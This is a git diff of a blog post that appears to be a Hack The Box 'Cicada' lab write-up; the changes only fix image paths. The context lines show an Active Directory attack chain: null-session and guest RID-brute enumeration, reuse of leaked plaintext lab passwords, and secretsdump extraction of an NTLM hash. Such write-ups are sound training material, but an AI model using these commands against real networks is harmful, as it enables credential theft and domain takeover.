@@ -1,3 +1,4 @@
+
 ---
 title: "HTB Cicada — Anonymous Share Leak, Guest RID-Brute & Backup Operators to Domain Admin"
 date: 2026-08-29
@@ -105,7 +106,7 @@ enum4linux -a -r -K 5000 10.129.231.149
 
 The null session connects successfully:
 
-![emum4linux](assets/images/CICADA/enum.png)
+![enum4linux](/assets/images/CICADA/enum.png)
 
 The domain SID also resolves successfully, identifying the `CICADA` domain.
 
@@ -204,7 +205,7 @@ cat "Notice from HR.txt"
 
 The file contains a new-hire welcome notice containing a default password:
 
-![HR](assets/images/CICADA/hr.png)
+![HR](/assets/images/CICADA/hr.png)
 
 ```text
 Your default password is: Cicada$M6Corpb*@Lp#nZp!8
@@ -236,7 +237,7 @@ nxc smb 10.129.231.149 -u 'guest' -p '' --rid-brute 10000
 
 The domain begins resolving real objects:
 
-![users](assets/images/CICADA/users.png)
+![users](/assets/images/CICADA/users.png)
 
 The important user accounts are:
 
@@ -300,7 +301,7 @@ Authenticated SAMR access now provides considerably more information than the an
 ```bash
 nxc smb 10.129.231.149 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
 ```
-![david](assets/images/CICADA/david.png)
+![david](/assets/images/CICADA/david.png)
 
 Among the returned user information is a description containing another plaintext credential:
 
@@ -341,7 +342,7 @@ smbclient -U 'cicada.htb\david.orelious%aRt$Lp#7t*VQ!3' //10.129.231.149/DEV -c 
 
 The script contains another hardcoded credential:
 
-![emily](assets/images/CICADA/emily.png)
+![emily](/assets/images/CICADA/emily.png)
 
 This gives us the third account in the credential chain:
 
@@ -383,7 +384,7 @@ Check the user's privileges:
 ```powershell
 whoami /priv
 ```
-![Backup](assets/images/CICADA/backup.png)
+![Backup](/assets/images/CICADA/backup.png)
 
 The important entries are:
 
@@ -453,7 +454,7 @@ secretsdump.py -sam sam.save -system system.save LOCAL
 
 The extracted local Administrator account contains an NTLM hash:
 
-![Hash](assets/images/CICADA/hash.png)
+![Hash](/assets/images/CICADA/hash.png)
 
 The important value is the NTLM hash:
 
